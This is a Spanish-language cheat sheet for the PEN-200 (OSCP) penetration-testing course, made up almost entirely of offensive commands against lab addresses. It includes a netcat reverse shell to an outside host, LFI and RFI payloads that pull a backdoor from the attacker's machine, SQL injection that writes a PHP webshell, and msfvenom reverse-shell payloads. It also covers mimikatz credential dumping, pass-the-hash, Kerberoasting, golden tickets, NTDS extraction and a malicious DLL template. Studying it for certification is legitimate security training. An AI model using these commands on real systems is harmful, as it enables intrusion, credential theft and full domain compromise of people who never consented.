Cheat-Sheets-PEN-200-Course
 
Cheats-Sheet:
https://mqt.gitbook.io → Página Interesante

sudo mount -t cifs //192.168.x.150/<Resource> /home/kali/<Workspace>/mnt/ -o username=usuario password=password → Montar un recurso SMB en nuestra máquina

Start-Process -FilePath "C:\Tools\nc.exe" -ArgumentList "-e cmd 192.168.x.151 6000" → Arrancar un binario en powershell 

MATCH (m:User) RETURN m → Usuarios en BloodHound

Transferencia de ficheros con netcat:
nc.exe -lvp 4444 > FiletoTransfer → Cliente
nc 192.168.20.X 4444 -w 3 < FiletoTransfer → Servidor

XFREERDP Options:
/w:1920 /h:1080 /fonts /smart-sizing

RDP Activación:
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall add rule name="Regla de Escritorio remoto" dir=in action=allow protocol=TCP localport=3389
net start TermService

RDP Desactivación:
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
netsh advfirewall firewall delete rule name="Regla de Escritorio remoto"
net stop TermService

Cerrar sesiones desde CMD:
query user
logoff <ID>

Wordpress Enumeración:
wpscan --url http://192.168.x.150 --enumerate p --plugins-detection aggressive -o websrv1/wpscan → Escaneo con wpscan

Git - Enumeración:
git status & git log → Enumerar git
git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1

Descargar un archivo en powershell:
$url = "https://www.ejemplo.com/archivo.zip"  # Cambia la URL a la del archivo que deseas descargar
$destino = "C:\ruta\donde\guardar\archivo.zip"  # Cambia la ruta de destino según tus preferencias
Invoke-WebRequest -Uri $url -OutFile $destino → Comando Final

Comandos:
sudo swaks -t <final - email> --from <start - email> --attach @config.Library-ms --server 192.168.x.150 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap → Enviar un phishing

(Import-Clixml -Path user.txt).GetNetworkCredential().password → Desencriptar una credencial en powershell
mysql -uuser -p -h host → Conectarse a la base de datos MySQL
prompt off → Apagar las consultas de transferencias de archivos por FTP
archivo.pcap → Analizar archivo con tshark

Enumeración SNMP:
WEB: https://www.circitor.fr/Mibs/Html/N/NET-SNMP-EXTEND-MIB.php
snmpwalk -c public -v1 -t 10 192.168.x.150 → Ver toda la información en SNMP
snmpwalk -c public -v1 192.168.x.150 <ID> → Ver información específica en función del SNMP

Intoducción a los ataques de aplicaciones web:
--script=http-enum → Fuzzing con nmap

-d ‘{"password":"fake","username":"admin"}’  -H ‘Content-Type:application/json’ → Enviar una data con curl en formato json

ssh -i id_rsa -p 2222 user@192.168.x.150 → Conexión ssh con id_rsa

Ataques comunes en aplicaciones web:
Directory Traversal (Windows) - C:\Windows\System32\drivers\etc\hosts → Verificar Path Traversal en windows

C:\inetpub\logs\LogFiles\W3SVC1\ - C:\inetpub\wwwroot\web.config → Rutas relevantes en un IIS

curl http://192.168.50.16/cgi-bin/../../../../etc/passwd → Vulnerabilidad en Apache 2.4.49

*Urlencodear la petición con curl desde la shell*
*Se debe incluir un & si en la url ya está un ?*

Registros de Apache en Windows → C:\xampp\apache\logs 
Registros de Apache en Linux → /var/log/apache2/access.log

curl http://192.168.x.150/index.php?page=php://filter/resource=admin.php → Ver el código php en un LFI
curl http://192.168.x.150/index.php?page=php://filter/convert.base64-encode/resource=admin.php → Conocer el código php en un LFI usando convert.base64-encode
curl "http://192.168.x.150/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>" → Usar el envoltorio data para ejecutar comandos
curl "http://192.168.x.150/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls" → Usar el envoltorio data cuando la aplicación web está protegida por un WAF
curl "http://192.168.x.150/index.php?page=http://192.168..x.151/simple-backdoor.php&cmd=ls" → Explotación del RFI

.phps, .php7, .pHP → Ejemplo de extensiones de archivos para eludir filtros

ssh-keygen → Generar una clave pública
ssh -p 2222 -i fileup root@192.168.x.150 → Conectarse por ssh con tu clave privada 
*Eliminar el archivo known_hosts*
*Intentar sobrescribir archivos modificando su nombre ../../../../../../archivo*

(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell → Saber dónde se están ejecutando los comandos en windows

"&cat /etc/passwd&" → Ejemplo de command Injection 

Ataques de Inyección SQL:
MYSQL:
select * FROM Users WHERE user_name='user' → Ejemplo de consulta MySQL
select version(); → Ver la versión de MySQL
select system_user(); → Ver el usuario de MySQL
show databases; → Muestra las bases de datos
SELECT user, authentication_string FROM mysql.user WHERE user = 'user'; → Seleccionar la contraseña hasheada de un usuario

MSSQL:
impacket-mssqlclient Administrator:Password@192.168.x.150 -windows-auth → Conectarse a una base de datos MSSQL de forma remota
SELECT @@version; → Ver la versión de MSSQL
SELECT name FROM sys.databases; → Listar las bases de datos
SELECT * FROM user.information_schema.tables; → Ver las tablas de la base de datos
select * from offsec.dbo.users; → Ver una tabla específica
Remote Command Execution:
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure ‘xp_cmdshell’ , 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'command';

SQLi:
user' OR 1=1 -- // → SQLi básico
' or 1=1 in (select @@version) -- // → Versión de la base de datos
' or 1=1 in (SELECT * FROM users) -- // → Ver información de los usuarios
' or 1=1 in (SELECT password FROM users) -- // → Ver la contraseña de los usuarios
‘ or 1=1 in (SELECT password FROM users WHERE usename='admin') -- // → Ver la contraseña de un usuario
' ORDER BY 1-- // → Buscar el número de columnas
%' union select database(), user(), @@version, null, null -- // → Sacar la información en función de las columnas 
' union select null, table_name, column_name, table_shema, null from information_schema.columns where table_schema=database() -- // → Ver información adicional en la base de datos 
http://192.168.x.150/blindsqli.php?user=user' AND IF (1=1, sleep(3), 'false') -- // → Blind SQLi
‘ UNION SELECT "<?php system($_GET ['cmd']);?>”, null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- // → Ejecutar comandos a través de un SQLi

SQLMAP:
sqlmap -u http://192.168.x.150/blindsqli.php?user=1 -p user
sqlmap -r request.txt 
sqlmap --ignore-redirects -r request.txt --technique B -p username --current-user
sqlmap --ignore-redirects -r request.txt --batch --technique B -p username -U <username> --passwords
sqlmap --ignore-redirects -r request.txt -p <parámetro>  --os-shell  --web-root "<Ruta de la Aplicación Web>"
sqlmap --ignore-redirects -r requests.txt -batch -dbs -v 3
sqlmap --ignore-redirects -r requests.txt -batch --dump -D <database> 
sqlmap --ignore-redirects -r requests.txt -batch --dump -T <table> -D <database> 

Ataques del lado del cliente:
exiftool -a -u archivo.pdf → Extraxión de metadatos con exiftool

canarytokens.org → Crear enlaces maliciosos que crean una huella digital del objetivo

Localización de exploits públicos:
exploitdb → Base de datos de exploits
packetstorm → Base de datos de exploits
github → Fuente de exploits

Frameworks de explotación:
Metasploit-Framework
Core Imapact
Canvas
BeEF

searchsploit → Buscar exploits en exploitdb 
*Actualizar antes del ejercicio → sudo apt update && sudo apt install exploitdb*

Reparación de exploits:
sudo apt install mingw-w64 → Instalar compilador

i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe → Compilación cruzada en kali

sudo wine syncbreeze_exploit.exe → Ejecutar el binario compilado desde Kali-Linux

verify=False → Indicarle al exploit que el certificado es autofirmado
csrf_param = "_sk_” 

Evasión de antivirus:
The Enigma Protector → Evaidir la detección basada en firmas
Virus total → Analizar con antivirus
Antiscan.me → Alternativa a virus total
Avira Free Security → Detectar una protección de antivirus

Ataques de contraseña:
sudo hydra -l user -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.x.150 → Fuerza bruta por ssh con hydra
sudo hydra -L usernames.txt -p password rdp://192.168.x.150 → Fuerza bruta por RDP con hydra

Fuerza bruta HTTP:
sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.x.150 http-post-form "/index.php:username=user&password=^PASS^:Login failed. Invalid"

Reglas en hashcat:
$! $1 c → Ejemplo de una regla

Descifrar archivos kdbx:
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue → Buscar archivos kdbx
keepass2john archivo.kdbx > keepass.hash → Obtener el hash del archivo
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force → Ejemplo con hashcat (kdbx <Fuerza Bruta>)

Desencriptar una id_rsa:
ssh2john id_rsa > ssh.hash → Obtener el hash de la id_rsa

Comandos de mimikatz:
C:\Windows\system32\config\sam → Ruta de la base de datos SAM
privilege::debug
token::elevate
sekurlsa::logonpasswords
lsadump::sam

Pass the hash:
smbclient //192.168.x.150/<Resource> -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.x.150

impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.x.150

ls \\192.168.x.150\resource → Recurso compartido con powershell
dir \\192.168.x.150\resource → Recurso compartido con cmd

Obtener un hash NTLMv2:
sudo responder -I tap0 → Uso de responder para capturar el hash NTLMv2
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.x.150 -c "powershell -enc JABjAGwAaQ..."

Escalada de privilegios en Windows:
Piezas clave:
Nombre de usuario y nombre de host (whoami)

Membresías de grupo del usuario actual (whoami /groups)

Usuarios y grupos existentes:
users[cmd → net user - powershell → Get-LocalUser] 
groups[cmd → net localgroup powershell → Get-LocalGroup] 
miembros[Get-LocalGroupMember]

Sistema operativo, versión y arquitectura (systeminfo)

Información de la red (ipconfig /all) 

Enrrutamiento(route print) 

Conexiones de red y puertos (netstat -ano)

Aplicaciones instaladas:
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname → Aplicaciones de 32bits 
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname → Aplicaciones de 64bits

Procesos corriendo (Get-Process)

Buscar Archivos:
Get-ChildItem -Path C:\File -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue → Búsqueda de Archivos

Runas:
runas /user:Administrator cmd → Ejecutar una CMD como otro usuario

Historial de Powershell:
Get-History → Ver historial de Powershell
(Get-PSReadlineOption).HistorySavePath → Ver PSReadline

Servicios Ejecutándose:
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} → Servicios

Remplazar un binario:


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("command");
  
  return 0;
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


x86_64-w64-mingw32-gcc binary.c -o binary.exe → Compilación del binario

Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'service'} → Tipo de servicio

net stop 'service' → Detener servicio

whoami /priv → Ver todos los privilegios del usuario actual

shutdown /r /t 0 → Reiniciar el sistema

powershell -ep bypass → Habilitar la ejecución de scripts

Secuestro de DLL:
1. El directorio desde el que se cargó la aplicación.
2. El directorio del sistema.
3. El directorio del sistema de 16 bits.
4. El directorio de Windows.
5. El directorio actual.
6. Los directorios que se enumeran en la variable de entorno PATH.

Restart-Service 'Service' → Restablecer un servicio

$env:path → Mostrar path en powershell

Código para una DLL maliciosa:


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("command");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll → Compilar el código para crear la DLL

Explotación de Ruta:
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe

wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """ → Enumerar los servicios vulnerables

Start-Service 'service' → Arrancar servicio
Stop-Service 'service' → Detener servicio

Tareas Programadas:
schtasks /query /fo LIST /v → Ver las tareas programadas

Abusar del SeImpersonatePrivilege:
.\PrintSpoofer.exe -i -c 'cmd' → Uso de PrintSpoofer
Alternativa(Familia Potato)

Escalada de privilegios en Linux:
Reconocimiento:
id → Identificación del usuario
cat /etc/passwd → Enumerar usuarios
hostname → Nombre del host
uname -a → Versión del sistema operativo
ps aux → Enumerar procesos
ifconfig → Interfaz de red
route - routel → Tablas de enrruamiento
ss -anp → Conexiones de red activas
cat /etc/iptables/rules.v4 → Configuración de firewall
/etc/crontab - crontab -l → Ver tareas programadas
sudo crontab -l → Enumerar tareas cron como root
dpkg -l → Aplicaciones instaladas
find / -writable -type d 2>/dev/null → Buscar archivos con premiso de escritura
cat /etc/fstab → Unidades montadas
lsblk → Discos disponibles
/sbin/modinfo <módulo> → Info sobre un módulo

Ejecutables con el bit-SUID:
find / -perm -4000 2>/dev/null → Enumerar ejecutables con el bit-SUID

Crear diccionarios en base a una palabra:
crunch 6 6 -t Lab%%% > wordlist → Crear un diccionario en base a una palabra

Ver todos los procesos en tiempo real:
watch -n 1 "ps -aux | grep pass" → Ver los procesos en tiempo real

Capturar tráfico de red:
sudo tcpdump -i lo -A | grep "pass" → Capturar tráfico

Ver trabajos CRON:
grep "CRON" /var/log/syslog → Ver trabajos cron

Privilegios de escritura en /etc/passwd:
openssl passwd w00t → Abusar de los privilegios en el /etc/passwd
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

Buscar capacidades asignadas al usuario actual:
/usr/sbin/getcap -r / 2>/dev/null → Buscar capacidades

Abusar de privilegios en ejecutables:
GTFObins → Sitio web para todos los binarios de UNIX (Escalada de privilegios)
sudo -l → Comandos permitidos con sudo para el usuario 

Redirección de puertos y tunelización ssh:
*Rango de puertos privilegiados: (0 - 1024)*

Tunelización con socat:
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432 → Tunelización con socat

Conexión a una base de datos PostgreSQL:
psql -h 192.168.50.63 -p 2345 -U postgres → Conectarse a una base de datos PostgreSQL
\l → Listar las bases de datos existentes
\c confluence → Conectarse a una base de datos
select * from cwd_user; → Ver la información de una tabla

Escaneo de Puertos con Netcat:
for i in $(seq 1 254); do nc -zv -w 1 192.168.x.$i 445; done → Bucle para verificar un puerto abierto con netcat

Tunelización en Linux:
Redirección ssh local:
ssh -N -L 0.0.0.0:4455:192.168.x.150:445 user@192.168.x.152 → Tunelización con ssh
ss -ntplu → Verificar el proceso de tunelización

Redirección por ssh dinámica:
ssh -N -D 0.0.0.0:9999 user@192.168.x.152
Editar → /etc/proxychains4
socks5 192.168.x.150 9999
 
proxychains nmap -vvv -sT --top-ports=20 -Pn 192.168.x.152 → Acciones de ejemplo

*Reducir los valores tcp_read_time_out y tcp_connect_time_out en el archivo de configuración de Proxychains*

Reenvío de puerto remoto SSH:
sudo systemctl start ssh → Habilitar SSH en kali
sudo ss -ntplu → Comprobar el servicio
*Consejo : es posible que deba permitir explícitamente la autenticación basada en contraseña configurando PasswordAuthentication en sí en / etc/ssh/sshd_config*
ssh -N -R 127.0.0.1:2345:192.168.x.152:5432 kali@192.168.x.151
psql -h 127.0.0.1 -p 2345 -U postgres → Autenticación en PGDATABASE01

Reenvío de puerto dinámico remoto SSH:
ssh -N -R 9998 kali@192.168.x.151 → Autenticación hacia kali
socks5 127.0.0.1 9998 → Editar /etc/proxychains4

Uso de sshuttle:
socat TCP-LISTEN:2222,fork TCP:192.168.x.152:22
sshuttle -r user@192.168.x.150:2222 10.10.x.0/24 172.16.x.0/24


Tunelización en Windows:
ssh.exe:
\Windows\System32\OpenSSH → Ruta
sudo systemctl start ssh
xfreerdp /u:user /p:password /v:192.168.x.192
where ssh → Localizar ssh.exe
ssh.exe -V → Ver la versión de ssh
ssh -N -R 9998 kali@192.168.x.151 → Autenticación hacia kali
socks5 127.0.0.1 9998 → Editar /etc/proxychains4

Plink:
find / -name plink.exe 2>/dev/null → Encontrar Plink en kali
C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.x.151 → Uso de Plink
xfreerdp /u:user /p:password /v:127.0.0.1:9833 → Conexión final

Netsh:
xfreerdp /u:user /p:password /v:192.168.x.150

netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.x.150 connectport=22 connectaddress=10.10.x.220 → Uso de Netsh

netsh interface portproxy show all → Ver las conexiones

netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.x.150 localport=2222 action=allow → Crear un hueco en el firewall

ssh user@192.168.x.150 -p2222 → Conexión final

netsh advfirewall firewall delete rule name="port_forward_ssh_2222" → Eliminar la regla del firewall

netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.x.150 → Eliminar el reenvío de puertos

Tunelización profunda a través de paquetes:
chisel server --port 8080 --reverse → Chisel en la máquina kali

/tmp/chisel client 192.168.x.150:8080 R:socks > /dev/null 2>&1 & → Chisel en la máquina objetivo

sudo apt install ncat → Instalación de ncat

ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@192.168.x.152

Túnel DNS con dnscat2:
dnscat2-server <Domain>
cd dnscat/
./dnscat feline.corp
dnscat2-server <Domain>

The metasploit - Framework:
Base de datos:
sudo msfdb init → Iniciar la base de datos de metasploit 
sudo systemctl enable postgresql
db_status → Verificar la conectividad con la base de datos

Workspace:
workspace → Muestra los espacios de trabajo
workspace -a myspace → Crear un nuevo espacio de trabajo
workspace myspace → Moverse al espacio de trabajo

Recopilación de información:
db_nmap → nmap en metasploit (contiene los mismos comandos)
hosts → Hosts descubiertos
services → Servicios descubiertos (-p filtra los puertos)

Commandos:
show -h Mostrar los módulos (Sustituir -h por el módulo para seleccionarlo)
show missing → Muestra la opción que falta
search type:auxiliary smb → Ejemplo
unset RHOSTS → Quitar un host
services -p 445 --rhosts → Seleccionar un host de la base de datos
vulns → Comprobar si detectó vulnerabilidades
set SSL false → Opción para el SSL

Sesiones:
sessions -l → Enumerar las sesiones
sessions -k ID → Matar una sesión

Comandos II:
run -j → Lanzar el ataque en segundo plano
*Prestar atención a / en los payloads*
channel -l → Canales activos (Su uso es igual a sessions)
l (Para movernos en nuestra máquina kali)
jobs → Enumerar trabajos

Port Forwarding con Metasploit-Framework:
portfwd add -l 135 -p 23 -r <target>
portfwd delete -i <index>

Pivoting con Metasploit-Framework:
route add <target> <mask> <session id>
auxiliary/scanner/portscan/tcp → nmap in Metasploit-Framework

msfvenom:
msfvenom -l payloads --platform windows --arch x64 → Enumerar las cargas útiles con estas características
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.x.150 LPORT=443 -f exe -o binary.exe → Ejemplo de .exe
*netcat no maneja payloads preparados* 

Post-Explotación:
idletime → Muestra el tiempo que un usuario ha estado inactivo

migrate ID → Migrar a un proceso menos detectable

execute -H -f notepad → Crear un proceso para migrar a él

Import-Module NtObjectManager & Get-NtTokenIntegrityLevel → Mostrar nuestro nivel en la máquina

use exploit/windows/local/bypassuac_sdclt → Exploit para el UAC bypass

creds_msv → Con mimikatz para las creds NTLM

route add 172.16.x.0/24 12 → Añadir una ruta

route print → Mostrar todas las rutas

use auxiliary/scanner/portscan/tcp & set RHOSTS 172.16.x.200 & set PORTS 445,3389 → Escaneo de puertos

use exploit/windows/smb/psexec & set SMBUser luiza & set SMBPass "BoccieDearAeroMeow1!" & set RHOSTS 172.16.x.200 & set payload windows/x64/meterpreter/bind_tcp & set LPORT 8000 → Pivotar

use multi/manage/autoroute & sessions -l & set session 12 → Agregar una ruta a la tabla de enrutamiento

use auxiliary/server/socks_proxy & set SRVHOST 127.0.0.1 & set VERSION 5 & Editar proxysocks→ Configurar el SOCKS

portfwd -h → Usar port forwarding 

portfwd add -l 3389 -p 3389 -r 172.16.x.200 → Ejemplo de pfw desde metasploit

set AutoRunScript post/windows/manage/migrate  → Migrar meterpreter a otro proceso automáticamente

set ExitOnSession false → Que el oyente siga aceptando nuevas sesiones

run -z -j → Ejecutar todo en segundo plano

sudo msfconsole -r script.rc → Como iniciar el script

*El escript debe tener la extensión .rc*


Active Directory Manual:
- Forests
- Domains
- Organization Units (OUs)

INFORMATION:
Permisos más importantes:
GenericAll: Todos los permisos en el objeto
GenericWrite: Editar atributos en el objeto
WriteOwner: Cambiar el propietario del objeto
WriteDACL: Editar ACE aplicado al objeto
AllExtendedRights: Cambiar contranseña, resetear contraseña, etc.
ForceChangePassword: Cambio de contraseña para el objeto
Self (Self-Membership): Agregarnos a nosotros mismos, por ejemplo, a un grupo 

net:
- net accounts
- net user /domain → Ver los usuarios del dominio
- net user admin /domain → Ver individualmente los usuarios
- net group /domain → Ver grupos del dominio
- net group "Sales Department" /domain → Ver individualmente grupos del dominio
- net group "Management Department" stephanie /add /domain → Agregarse a un grupo con net.exe
- net group "Management Department" stephanie /del /domain → Eliminarse de un grupo

PowerView:
- Import-Module .\PowerView.ps1 → Activarlo
- Get-NetDomain → Información básica del dominio
- Get-NetUser → Todos los usuarios del dominio
- Get-NetUser | select cn → grepear por atrubito
- Get-NetUser | select cn,pwdlastset,lastlogon → Inicio de sesión y cambios de contraseñas
- Get-NetGroup | select cn → Enumerar grupos
- Get-NetGroup "Sales Department" | select member → Ver grupos específicos
- Get-NetComputer → Enumerar los sistemas en AD
- Get-NetComputer | select operatingsystem,dnshostname → Filtrar por atributos interesantes
- Find-LocalAdminAccess → Encontrar acceso a otros sistemas como Administrador con nuestro usuario actual
- Get-NetSession -ComputerName files04 -Verbose → Ver el usuario que está conectado a la máquina
- Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
- Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
- Get-NetUser -SPN | select samaccountname,serviceprincipalname → Enumerar SPNs
- Get-ObjectAcl -Identity stephanie → Enumerar las ACE de un usuario
- Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104 → Convertir un SID a nombre en AD 
- Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights → Enumerando ACEs
- Find-DomainShare → Encontrar recursos compartidos

Comandos:
- setspn -L <user> → Enumeración de SPNs
- nslookup.exe <Domain Name> → Resolución de un dominio con nslookup.exe

Sharphound:
- Import-Module .\Sharphound.ps1 → Importar el script
- Invoke-BloodHound -CollectionMethod All → Invocación de Bloodhound

Bloodhound:
- sudo neo4j start → Iniciar neo4j
- bloodhound → Inicia bloodhound

CREDENTIALS:
mimikatz.exe:
- privilege::debug 
- token::elevate
- sekurlsa::logonpasswords → Volcar los logins en la máquina
- lsadump::sam → Volcar la memoria SAM
- sekurlsa::tickets → Tikets almacenados en memoria

Password Sprying:
*Buscar history files*
- PasswordSprying.ps1
- Invoke-DomainPasswordSpray -UserList lista_de_usuarios.txt -Password "Passw0rd" -Verbose
*Comentar el error*
- .\kerbrute_windows_amd64.exe passwordspray -d <Domain> .\usernames.txt "password" → Rociado de contraseñas con kerbrute

Crackmapexec:
- crackmapexec smb 192.168.x.150 -u 'user' -p 'password' -d oscp.exam --continue-on-success → Ataque con CRACKMAPEXEC
 
 Impacket:
 *Find sam and system files*
- impacket-mssqlclient user:password@192.168.x.150 -windows-auth → Conecterse a la base de datos MSSQL
- impacket-secretsdump -sam sam.file -system system.file LOCAL
- impacket-secretsdump user:password@192.168.x.150 → Volcar la SAM de manera remota con privilegios administrativos
- impacket-samrdump Administrator:password@192.168.x.150 → Volcar la SAM de manera remota (Privilegios Administrativos)
- impacket-netview Administrator:password -target 192.168.x.150 → Escuchar sesiones de manera remota (Privilegios Administrativos)

Kerbrute:
- kerbrute userenum -d <Domain> users.txt
- kerbrute bruteuser -d <Domain> passwords.txt user
- kerbrute passwordspray -d <Domain> users.txt password

Decrypt:
- gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE" → Ejemplo de cracking de contraseñas en kali

AS-REP Roasting:
*Verificar que el usuario no tenga autenticación previa*
- Get-NetDomainUsers -PreauthNotRequired → Verificar usuarios sin autenticación previa con PowerView
- impacket-GetNPUsers -dc-ip 192.168.x.150 <user> → Verificar usuarios sin autenticación previa
- impacket-GetNPUsers -dc-ip 192.168.x.150  -request -outputfile hashes.asreproast <user> → Ataque con impacket
- hashcat --help | grep -i "Kerberos" → Ayuda con hashcat 18200
- .\Rubeus.exe asreproast /nowrap → Volcado de TGTs con RUBEUS en Windows

Kerberoasting:
- .\Rubeus.exe kerberoast /outfile:hashes.kerberoast → Ataque con Rubeus.exe
- hashcat --help | grep -i "Kerberos" → Ayuda con hashcat 13100
- sudo impacket-GetUserSPNs -request -dc-ip 192.168.x.150 <user> → Kerberoasting desde Linux
*Si imapcket lanza un error → Sincronizar la hora de Kali con el DC (ntpdate - rdate)*

Silver Tikets:
• Hash de contraseña de SPN
• SID de dominio
• SPN objetivo

- kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:<Domain> /ptt /target:192.168.x.150 /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:user → Flasificación de un ticket con mimikatz
- klist → Confiramar el proceso
- iwr -UseDefaultCredentials <URL> → Acceder al recurso

Soncronización con el DC:
- lsadump::dcsync /user:Administrator → Obtener credenciales con mimikatz
- impacket-secretsdump -just-dc-user <user> <user>:"password"@192.168.x.150 → Ataque con impacket
*Este ataque solo se puede realizar con usuarios miembros de Domain Admins, Enterprise Admins,Administrators*

LATERAL MOVEMENT:
- wmic /node:192.168.x.150 /user:user /password:password process call create "command" → Ejecución de comandos con WMIC
- winrs -r:192.168.x.150 -u:user -p:password  "cmd /c hostname & whoami" → Ataque con WINRS
- ./PsExec.exe -i  \\192.168.x.150 -u user -p password cmd → Movimiento Lateral con PSExec

Pass the Hash:
sekurlsa::tickets → Ver los tickets en memoria con mimikatz
- impacket-secretsdump user@192.168.x.150 -hashes :369def79d8372408bf6e93364cc93075
- impacket-wmiexec -hashes :369def79d8372408bf6e93364cc93075 Administrator@192.168.x.150

Overpass the Hash (Autenticación en kerberos):
- sekurlsa::pth /user:user /domain:<Domain> /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell → OPTH con mimikatz
- net use \\192.168.x.150
- klist
- .\PsExec.exe \\192.168.x.150 cmd

Pass the ticket:
- sekurlsa::tickets /export → Exportar todos los TGT/TGS con mimikatz
- dir *.kirbi → Filtrar por la extensión .kirbi
- kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi → Inyectar el ticket con mimikatz
- klist → Comprobación del proceso

Persistencia en Active Directory:
Golden Ticket:
- lsadump::lsa /patch → Volcado de credenciales para obtener en hash NTLM de krbtgt
- kerberos::purge → Eliminar los tickets de kerberos exitentes
- kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt → Crear un boleto dorado con mimikatz
- misc::cmd → Lanzar un nuevo símbolo del sistema

Shadow Copies:
*Proceso desde el DC*
- vshadow.exe -nw -p  C: → Crear una copia de seguridad
- copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak → Copiarla
- reg.exe save hklm\system c:\system.bak → Guardar la sección system
- impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL → Extraer todas las credenciales con impacket

